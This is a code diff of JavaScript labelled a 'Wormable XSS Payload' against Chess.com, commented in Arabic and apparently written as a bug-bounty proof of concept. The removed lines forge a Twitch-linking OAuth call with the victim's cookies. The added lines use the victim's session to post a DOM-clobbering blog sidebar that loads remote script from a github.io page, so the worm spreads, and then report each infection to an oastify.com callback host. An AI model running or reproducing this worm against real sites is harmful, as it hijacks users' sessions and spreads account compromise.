@@ -1,12 +1,38 @@
+// ==========================================
+// Wormable XSS Payload - Chess.com 
+// ==========================================
 
-var hackerCallbackUrl = "https://www.chess.com/twitch/connect?code=4jmjaa72a19vzr16e1674u1pbi9xfq&scope=user_read+viewing_activity_read+user_subscriptions&state=4e13c18a1af79282d354f443108f9fed"; 
+// 1. تحديد الـ API Endpoint
+const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
 
-fetch(hackerCallbackUrl, {
-    method: 'GET',
-    credentials: 'include' 
+// 2. تجهيز البايلود اللي هيتنشر (نفس הـ Clobbering بتاعك)
+const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
+
+// 3. تجهيز الـ JSON Body
+const requestBody = {
+    "blogDetails": {
+        "url": "hacked-blog", // ممكن نسيبها فاضية أو نحط اسم ثابت
+        "name": "Important Update",
+        "privacy": "BLOG_PRIVACY_ID_EVERYONE", // مهم جداً تكون Everyone عشان تنتشر
+        "sidebarBlock": maliciousSidebar
+    },
+    "updateMask": "" // بيحدث كل حاجة
+};
+
+// 4. تنفيذ الهجوم (The Infection)
+fetch(apiUrl, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json, text/plain, */*',
+        'Connect-Protocol-Version': '1' // الهيدر ده كان موجود في ريكويستك
+    },
+    credentials: 'include', // عشان يبعت הـ PHPSESSID والـ ACCESS_TOKEN
+    body: JSON.stringify(requestBody)
 })
 .then(response => {
     if (response.ok) {
-        fetch("https://g0ht46bti8mfmyhnj3nivao8mzsqgi47.oastify.com/?impact=Twitch_Linked_Successfully");
+        // إبلاغ הـ Oastify بنجاح العدوى (Mass Defacement Initialized)
+        fetch("https://r804chj4qjuqu9pyrevt3lwjua01oucj.oastify.com/?impact=Worm_Propagated");
     }
 });
